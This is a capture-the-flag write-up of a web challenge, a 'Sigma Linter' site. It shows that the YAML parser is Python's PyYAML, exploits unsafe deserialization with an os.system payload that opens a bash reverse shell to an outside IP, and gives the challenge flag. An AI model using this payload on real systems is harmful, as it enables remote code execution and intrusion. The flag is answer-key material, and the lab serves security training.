**Category**: Web  
**Author**: John Hammond

![](./files/01%20-%20Sigma%20Linter/01%20-%20Sigma%20Linter.png)

---

The challenge instance hosted a "Sigma Linter" site that submitted user supplied YAML to a `/lint` endpoint.

![](./files/01%20-%20Sigma%20Linter/01.png)

The HTTP request behind the above screenshot looked like this:

```
POST /lint HTTP/1.1
Host: 10.1.160.111
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.1.160.111/
Content-Type: application/json
Content-Length: 36
Origin: http://10.1.160.111
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Priority: u=0

{
    "yaml_content":"...",
    "method":"s2"
}
```

The `method` parameter seemed to be irrelevant and ignored. The response to the above request was:

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Thu, 09 Oct 2025 23:30:07 GMT
Content-Type: application/json
Content-Length: 244
Connection: keep-alive

{
    "error_type":"yaml_error",
    "formatted_code":"...",
    "reasons":[
        "YAML parsing error: while parsing a block node\nexpected the node content, but found '<document end>'\n
        in \"<unicode string>\", line 1, column 1:\n    ...\n    ^"
    ],
    "result":false
}
```

This revealed that whatever was parsing the YAML input was written in Python. PyYAML has been known to be vulnerable to unsafe deserialization on numerous occasions. There were numerous ways to exploit it, but I chose to spawn a connectback shell using this payload:

```
!!python/object/new:os.system [\"bash -c 'bash -i >& /dev/tcp/10.200.2.233/1337 0>&1'\"]
```

The above payload can be inserted as-is directly into the `yaml_content` field in Burp Repeater.

![](./files/01%20-%20Sigma%20Linter/02.png)

Flag: **flag{b692115306c8e5c54a2c8908371a4c72}**
